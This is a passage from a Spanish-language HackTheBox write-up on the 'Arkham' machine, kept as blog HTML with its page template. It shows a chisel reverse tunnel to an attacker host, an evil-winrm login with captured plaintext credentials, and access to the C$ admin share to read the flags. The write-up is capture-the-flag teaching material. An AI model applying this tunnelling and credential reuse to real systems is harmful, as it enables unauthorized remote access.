+<p>Ahora, le indicamos a nuestra máquina atacante que levante el puerto <strong>5988</strong> (que sera el que reciba el Port Fortwarding) y actue como servidor (listener) mediante <strong>chisel</strong>:</p>
+
+<pre><code class="language-bash">❭ ./chisel server -p 5988 --reverse
+2021/04/26 05:50:07 server: Reverse tunnelling enabled
+2021/04/26 05:50:07 server: Fingerprint hZ7G/q+Y+FZ0cm+H0AlBa9rOHdjlYpb59JtMBGs13eQ=
+2021/04/26 05:50:07 server: Listening on http://0.0.0.0:5988
+</code></pre>
+
+<p>Tamo, ahora vamos al cliente e indicamos que tome el puerto <strong>5985</strong> y reenvie su trafico al puerto <strong>5988</strong> de la máquina <strong>10.10.14.14</strong> que simula realmente el puerto <strong>5985</strong> del localhost:</p>
+
+<pre><code class="language-powershell">c:\Users\Alfred\Videos&gt;chisel.exe client 10.10.14.14:5988 R:5985:localhost:5985
+chisel.exe client 10.10.14.14:5988 R:5985:localhost:5985
+2021/04/28 00:42:05 client: Connecting to ws://10.10.14.14:5988
+2021/04/28 00:42:07 client: Connected (Latency 200.7885ms)
+</code></pre>
+
+<p>Recibimos en el servidor:</p>
+
+<pre><code class="language-bash">...
+2021/04/26 25:25:25 server: session#1: tun: proxy#R:5985=&gt;localhost:5985: Listening
+</code></pre>
+
+<p>Validando el contenido del puerto <strong>5988</strong> vemos:</p>
+
+<pre><code class="language-bash">❭ lsof -i:5988
+COMMAND     PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
+chisel  1050047 root    6u  IPv6 4641412      0t0  TCP *:5988 (LISTEN)
+chisel  1050047 root    7u  IPv6 4642498      0t0  TCP 10.10.14.14:5988-&gt;10.10.10.130:49772 (ESTABLISHED)
+❭ lsof -i:5985
+COMMAND     PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
+chisel  1050047 root    8u  IPv6 4642501      0t0  TCP *:5985 (LISTEN)
+</code></pre>
+
+<p>Bien, ahora probemos conectarnos mediante <strong>evil-winrm</strong> con las credenciales que tenemos:</p>
+
+<ul>
+  <li>Toma por defecto el puerto <strong>5985</strong>, y pues como hay un redireccionamiento actual hacia ese puerto de nuestra máquina, no debemos indicarselo ;)</li>
+</ul>
+
+<pre><code class="language-bash">❭ evil-winrm -i localhost -u 'Batman' -p 'Zx^#QZX+T!123'
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179bash_evilwinrm_batmanSH_done.png" alt="179bash_evilwinrm_batmanSH_done" /></p>
+
+<p>Perfecto, tenemos una <strong>PowerShell</strong> como el usuario <strong>batman</strong> en el sistema :O Sigamos jugando…</p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Si vemos los grupos con los que cuenta <strong>Batman</strong>, tenemos que en teoria somos administradores:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users&gt; net user Batman
+User name                    Batman
+Full Name
+Comment
+User's comment
+Country/region code          001 (United States)
+Account active               Yes
+Account expires              Never
+
+Password last set            2/3/2019 9:25:50 AM
+Password expires             Never
+Password changeable          2/3/2019 9:25:50 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   4/27/2021 9:00:34 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Remote Management Use
+                             *Users
+Global Group memberships     *None
+The command completed successfully.
+</code></pre>
+
+<p>Por lo que podriamos ver el contenido de la flag, pero no :( Además si vemos nuestros permisos claramente nos damos cuenta que no somos admins aun:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</code></pre>
+
+<p>Jugando un rato a ver por que metodo podriamos romper esto, recordamos algo.</p>
+
+<p>En la imagen donde estaban las credenciales de <strong>Batman</strong> habia un comando para entrar a un recurso llamado <strong>gotham</strong>… Y si modificamos esa linea pero para ingresar al directorio <code>C:\</code> del sistema? Pues buscando info, llegamos a este recurso:</p>
+
+<ul>
+  <li><a href="https://superuser.com/questions/328461/how-to-access-c-share-in-a-network#answer-328531">How to access C$ share in a network?</a>.</li>
+</ul>
+
+<p>Nos interesa el <strong>cuarto</strong> paso, que juntandolo con <a href="https://www.getfilecloud.com/supportdocs/display/cloud/How+to+Mount+CIFS+Shares+from+Windows+Command+Line">este articulo</a> quedaria asi la linea:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users&gt; net use G: \\ARKHAM\C$
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users&gt; cd G:\
+*Evil-WinRM* PS G:\&gt; 
+</code></pre>
+
+<p>Entonces, montamos el directorio <code>C:\</code> en un directorio compartido llamado <code>G:\</code> y nos permite ver las flags:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179flags.png" alt="179flags" /></p>
+
+<p>Listones. Igual entiendo que debe existir otra manera para obtener una shell con todos los permisos, pero despues de un rato no encontre como hacerlo :( Intentaré ver como cambiar nuestros permisos a unos de full admin, pero mientras tanto subo todo el proceso para llegar hasta aqui, relativamente somos admins ;)</p>
+
+<p>…</p>
+
+<p>Ufff vaya máquina eh! Por momentos me parecia que estaba ante una máquina nivel <strong>Hard</strong>, pero fue interesante, todos los ataques de deserializacion me encantan, asi que disfute mucho esa parte :)</p>
+
+<p>Y bueno, aaaaaaaaaaaaaaa calmarnos y a tomarnos un vasito de agua, pero sin dejar de pensar en romper todo! Nos vemos, gracias por leer.</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Arkham&url=http://localhost:4000/htb/arkham" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#RPF">RPF</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#crypto">crypto</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#deserialization">deserialization</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#java">java</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#winrm">winrm</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/crimestoppers">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120banner.png" alt="HackTheBox - CrimeStoppers"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/crimestoppers">HackTheBox - CrimeStoppers</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel difícil. Explotación web con filtros (wrappers) consiguiendo LFI y RCE, contraseñas de Thunderbird, correos llenos de odio, persistencias locas (un rootkit) y jugueteo entre reversing y criptografía....</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">08 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/ophiuchi">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ophiuchi/315banner.png" alt="HackTheBox - Ophiuchi"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/ophiuchi">HackTheBox - Ophiuchi</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel medio. La deserialización no puede faltar, pero esta vez parseando sintaxis YAML. Enumeración básica y finalmente tendremos que jugar con instrucciones de WebAssembly para modificar una constante...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">03 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/tenet">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309banner.png" alt="HackTheBox - Tenet"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/tenet">HackTheBox - Tenet</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel medio. Exploraremos deserialización insegura de objetos en PHP, reutilización de contraseñas y encontraremos pequeños fallos en scripts de bash :P
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">12 Jun 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
